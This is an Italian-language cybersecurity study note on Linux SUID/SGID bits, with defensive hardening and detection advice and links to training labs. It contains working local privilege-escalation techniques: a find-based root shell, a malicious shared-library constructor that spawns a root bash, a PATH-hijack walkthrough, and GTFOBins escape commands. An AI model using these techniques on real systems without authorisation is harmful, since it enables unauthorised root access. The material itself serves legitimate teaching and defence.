---
tipo: concetto
tag: [linux]
fase: 1
fonti: 6
aggiornato: 2026-07-02
stato: maturo
aliases: ["SUID e SGID"]

---

# SUID e SGID

## In breve

**SUID** (Set User ID) e **SGID** (Set Group ID) sono bit speciali dei [[Permessi Linux]] che permettono a un file eseguibile di girare con i privilegi del suo **proprietario** (o gruppo), anziché quelli di chi lo lancia. Sono funzionalità legittime del sistema, ma se mal configurate diventano uno dei vettori più comuni di [[Privilege Escalation Linux]].

## Come funziona

Normalmente, quando esegui un programma, esso gira con il tuo UID. Con SUID attivo, il programma gira con l'UID del proprietario del file — spesso **root**.

### Riconoscere SUID/SGID

```bash
ls -l /usr/bin/passwd
# -rwsr-xr-x 1 root root ...
#    ^
#    's' al posto di 'x' per owner = SUID attivo
```

La `s` nella posizione dell'esecuzione owner indica SUID. Una `s` nella posizione del gruppo indica SGID. Se la lettera è maiuscola (`S`), il bit è impostato ma il bit di esecuzione non c'è — situazione anomala.

### Perché esiste?

`/usr/bin/passwd` deve modificare `/etc/shadow` (leggibile solo da root). Grazie a SUID, un utente normale può cambiare la propria password senza essere root.

### In notazione ottale

- SUID = **4**000 → `chmod 4755 file`
- SGID = **2**000 → `chmod 2755 cartella`
- Sticky bit = **1**000 → `chmod 1777 /tmp`

## Esempio pratico

```bash
# Trovare TUTTI i file SUID nel sistema
find / -perm -4000 -type f 2>/dev/null

# Trovare TUTTI i file SGID
find / -perm -2000 -type f 2>/dev/null

# Esempio di sfruttamento: se 'find' ha SUID attivo
# (situazione anomala e pericolosa)
find . -exec /bin/sh -p \; -quit
# '-p' preserva i privilegi elevati: ottieni una shell root
```

### GTFOBins

GTFOBins (https://gtfobins.github.io) cataloga tutti i binari che, se hanno SUID attivo, permettono di ottenere una shell privilegiata. Prima di sfruttare un SUID, cerca il nome del binario su GTFOBins.

## Mitigazione e difesa

- Rimuovere SUID da binari che non ne hanno bisogno: `chmod u-s /path/al/file`.
- Auditare periodicamente con [[find]]: `find / -perm -4000 2>/dev/null`.
- Usare strumenti come Lynis per l'hardening automatico.
- Limitare l'uso di SUID ai soli binari di sistema essenziali.

---

# Strato esperto operativo

## Meccanismo interno (kernel + permessi)

Quando esegui un file, il kernel chiama `execve()`. Ogni processo ha **tre UID**: **RUID** (Real, chi ha lanciato), **EUID** (Effective, quello usato per i controlli di accesso) ed **SUID** (Saved). Normalmente RUID=EUID=tuo UID. Se il file ha il **bit SUID** (4000) impostato nei suoi `i_mode`, durante l'`execve()` il kernel imposta **EUID = UID del proprietario del file** (per SGID, EGID = gruppo del file). È l'EUID che determina i permessi → con un binario SUID-root l'EUID diventa 0 e il processo può toccare `/etc/shadow`.

> [!info] Perché conta la distinzione RUID/EUID
> Molti programmi SUID *droppano* i privilegi appena possibile (`setuid(getuid())`) per ridurre la superficie. Se il drop è fatto male (es. solo EUID, lasciando il **Saved UID** a 0) è possibile **riacquisire** root con `setuid(0)`: è la radice di molte vuln SUID storiche.

> [!warning] SUID ignorato sugli script
> Sul Linux moderno il bit SUID **non ha effetto sugli script interpretati** (`#!/bin/bash`): il kernel lo ignora per una nota race condition. Funziona solo su **binari compilati** (ELF). Per "scriptare" un SUID serve un wrapper compilato in C.

## Casi limite e varianti
- **`S` maiuscola**: bit SUID/SGID impostato ma **senza** bit di esecuzione → di fatto inerte/anomalo.
- **SGID su directory**: i nuovi file ereditano il **gruppo** della dir (non dell'utente). Usato per cartelle condivise; non dà privesc da solo, ma un binario SGID-root sì.
- **Sticky bit (1000)**: su `/tmp` impedisce di cancellare file altrui; nessuna relazione con SUID se non la notazione ottale.
- **`fs_nosuid`**: se la partizione è montata `nosuid`, il kernel **ignora** il bit (vedi troubleshooting privesc).

## Shared-object injection (vettore avanzato)

Se un binario SUID carica una libreria condivisa da un path **scrivibile** o **inesistente**, puoi fornire la tua `.so`.
1. **[ENUM]** Traccia le librerie caricate:
   ```bash
   strace -f /path/suidbin 2>&1 | grep -iE 'open|access|no such file' | grep '\.so'
   # cerca "ENOENT" su una .so in una dir dove puoi scrivere
   ```
2. **[SFRUTTABILE?]** Una `.so` cercata in `/tmp`, `$ORIGIN`, o una dir custom scrivibile.
3. **[EXPLOIT]** Compila una libreria con un costruttore che spawna shell:
   ```c
   // libhack.c
   #include <stdio.h>
   #include <stdlib.h>
   static void inject() __attribute__((constructor));
   void inject(){ setuid(0); setgid(0); system("/bin/bash -p"); }
   ```
   ```bash
   gcc -shared -fPIC -o /percorso/atteso/lib.so libhack.c
   /path/suidbin        # carica la TUA .so come root
   ```

## GTFOBins: pattern ricorrenti per SUID

Cercando un binario su GTFOBins sotto la funzione **`suid`**, i pattern tipici:
| Binario | Tecnica |
|---|---|
| `find` | `find . -exec /bin/sh -p \; -quit` |
| `vim`/`nano` | apri editor → `:py3 import os; os.execl("/bin/sh","sh","-pc","reset; exec sh -p")` |
| `cp` | sovrascrivi `/etc/passwd` o un file di sistema |
| `base64`/`cat`/`tac` | **leggi** `/etc/shadow` (read-primitive, poi crack offline) |
| `env`/`nice`/`stdbuf` | `env /bin/sh -p` |
| `bash` (raro SUID) | `bash -p` |

## Walkthrough end-to-end (SUID custom → root)

1. `find / -perm -4000 -type f 2>/dev/null` → trovo `/usr/local/bin/backup` (custom, non in GTFOBins).
2. `strings /usr/local/bin/backup` → vedo che chiama `system("tar -czf /tmp/b.tgz /home")` → `tar` **senza path assoluto** → PATH hijack.
3. `cd /tmp; echo '/bin/bash -p' > tar; chmod +x tar; export PATH=/tmp:$PATH`.
4. `/usr/local/bin/backup` → esegue il *mio* `tar` con EUID 0 → `# id` = root.
5. (Variante) se `strace` mostra una `.so` mancante in dir scrivibile → shared-object injection (sopra).

## Detection engineering
- **Creazione di nuovi SUID** è quasi sempre sospetta. Watch auditd:
  ```bash
  auditctl -a always,exit -F arch=b64 -S chmod,fchmod,fchmodat -F a1&04000 -k suid_set
  ```
- Baseline: `find / -perm -4000 -type f 2>/dev/null | sort > /var/lib/suid.baseline`, poi diff periodico (cron/Tripwire/AIDE).
- MITRE: **T1548.001** (Setuid and Setgid). IOC: SUID in `/tmp`, `/dev/shm`, `/home`.

## Troubleshooting (5 errori comuni)
1. **Shell SUID droppa a utente** → manca `-p`. Vedi meccanismo RUID/EUID.
2. **`find -perm -4000` vuoto** → partizione `nosuid` (`mount | grep nosuid`) o stai cercando su un mount sbagliato.
3. **SUID su script non funziona** → il kernel lo ignora sugli interpretati. Serve un wrapper ELF.
4. **`gcc` assente per la .so** → compila la libreria altrove (stessa arch, `uname -m`) e trasferiscila.
5. **`-perm -4000` vs `-perm /4000` vs `-perm 4000`** → `-4000` = ha *almeno* SUID (corretto). `/4000` = SUID *o* altro. `4000` = esattamente quei bit (sbaglia quasi sempre).

## Lab

- **[[OverTheWire Bandit]] – livelli 19-20**: il livello 19 usa un binario SUID (`bandit20-do`) per eseguire comandi come un altro utente e leggere una password protetta; è il primo contatto pratico con l'euid ereditato dal proprietario del file.
- **[[TryHackMe]] – Linux PrivEsc** (`tryhackme.com/room/linuxprivesc`): il task **SUID** ti fa enumerare con `find / -perm -4000`, sfruttare binari GTFOBins (`nano`, `base64`, `find`) e provare la **shared-object injection** su un SUID custom — l'intero walkthrough di questa nota.
- **pwn.college – modulo *Program Misuse***: serie sistematica di binari SUID da sfruttare (read/write primitive, shell escape). Ottimo per interiorizzare "quale primitiva mi dà questo binario".
- **[[GTFOBins]] (a secco)**: dopo `find / -perm -4000 -type f`, cerca ogni binario trovato sotto la funzione `suid` e verifica la tecnica su una VM. Nota bene il ruolo di `-p` in `/bin/sh -p`.

## Domande da colloquio
> **D: Cosa fa esattamente il bit SUID a livello di processo?**
> Durante `execve()` il kernel imposta l'**EUID** del nuovo processo all'UID del proprietario del file. È l'EUID a determinare i controlli di accesso, quindi il programma gira con i privilegi del proprietario (spesso root), non del chiamante.

> **D: Perché SUID non funziona sugli script shell?**
> Per una race condition tra l'apertura dello shebang e l'esecuzione dell'interprete (TOCTOU), i kernel Linux ignorano deliberatamente SUID/SGID sui file interpretati. Funziona solo sui binari ELF.

> **D: Come troveresti tutti i SUID e quale guarderesti per primo?**
> `find / -perm -4000 -type f 2>/dev/null`. Confronto la lista con GTFOBins e con una baseline: i binari **fuori** dal set standard (custom in `/usr/local`, `/opt`, `/tmp`) e quelli noti exploitable (find, vim, base64) hanno priorità.

## Collegamenti

- [[Permessi Linux]]
- [[Privilege Escalation Linux]]
- [[Utenti e Gruppi Linux]]
- [[Processi Linux]]
- [[find]]
- [[sudo]]
- GTFOBins

## Fonti

- GTFOBins – SUID: https://gtfobins.github.io/#+suid
- Man page chmod(1): https://man7.org/linux/man-pages/man1/chmod.1.html
- Man page credentials(7) — RUID/EUID/SUID: https://man7.org/linux/man-pages/man7/credentials.7.html
- HackTricks – SUID: https://book.hacktricks.xyz/linux-hardening/privilege-escalation#suid-and-sgid
- TryHackMe – Linux PrivEsc: https://tryhackme.com/room/linuxprivesc
- MITRE ATT&CK – Setuid and Setgid (T1548.001): https://attack.mitre.org/techniques/T1548/001/
